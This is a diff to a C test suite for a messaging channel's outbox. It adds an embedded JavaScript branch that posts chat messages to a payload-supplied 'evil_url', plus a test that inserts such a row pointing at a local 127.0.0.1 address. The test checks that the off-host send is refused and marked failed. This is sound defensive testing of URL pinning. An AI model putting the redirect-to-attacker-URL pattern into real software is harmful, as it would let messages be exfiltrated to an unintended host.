@@ -54,6 +54,12 @@ static void write_test_js(void) {
         "}\n"
         "function onOutbox(item) {\n"
         "  var p = JSON.parse(item.payload);\n"
+        "  if (p.evil_url) {\n"
+        "    channel.send({method: 'POST', url: p.evil_url,\n"
+        "      body: JSON.stringify({chat_id: parseInt(p.chat_id,10), text: p.text}),\n"
+        "      outbox_id: item.id, final: 1});\n"
+        "    return;\n"
+        "  }\n"
         "  channel.send({method: 'POST', url: base + '/bot' + token + '/sendMessage',\n"
         "    body: JSON.stringify({chat_id: parseInt(p.chat_id,10), text: p.text}),\n"
         "    outbox_id: item.id, final: 1});\n"
@@ -226,6 +232,43 @@ int main(void) {
         FAIL("outbox not auto-acked");
     }
     printf("  PASS: outbox wake -> shape send -> auto-ack\n");
+
+    /* 2b. base_url pin: an outbox item whose send URL points off the
+     * channel's configured base_url must be refused before any curl request
+     * is made — mock server's send count must not increase, and the outbox
+     * row must be failed via channel_fail_outbox. */
+    int sends_before = mock_tg_send_count();
+    sqlite3_exec(db,
+        "INSERT INTO channel_outbox(channel_name, session_id, payload) VALUES"
+        "('test', 1, '{\"evil_url\":\"http://127.0.0.1:1/evil\",\"chat_id\":\"42\",\"text\":\"x\"}')",
+        NULL, NULL, NULL);
+    channel_outbox_wake(DB_PATH, "test");
+
+    int failed = 0;
+    for (int attempt = 0; attempt < 40 && !failed; attempt++) {
+        usleep(100000);
+        const char *fc = "SELECT status FROM channel_outbox WHERE channel_name='test'"
+                         " AND payload LIKE '%evil_url%' LIMIT 1;";
+        sqlite3_stmt *stmt;
+        if (sqlite3_prepare_v2(db, fc, -1, &stmt, NULL) == SQLITE_OK) {
+            if (sqlite3_step(stmt) == SQLITE_ROW) {
+                const char *st = (const char *)sqlite3_column_text(stmt, 0);
+                if (st && strncmp(st, "failed", 6) == 0) failed = 1;
+            }
+            sqlite3_finalize(stmt);
+        }
+    }
+    if (!failed) {
+        kill(pid, SIGTERM); waitpid(pid, NULL, 0);
+        db_close(db); mock_server_stop();
+        FAIL("off-base_url outbox send was not failed");
+    }
+    if (mock_tg_send_count() != sends_before) {
+        kill(pid, SIGTERM); waitpid(pid, NULL, 0);
+        db_close(db); mock_server_stop();
+        FAIL("off-base_url outbox send reached the mock server");
+    }
+    printf("  PASS: base_url pin refuses off-host outbox send\n");
 
     /* 3. Proxied request over UDS → onRequest → reply + emit */
     char *reply = uds_request(
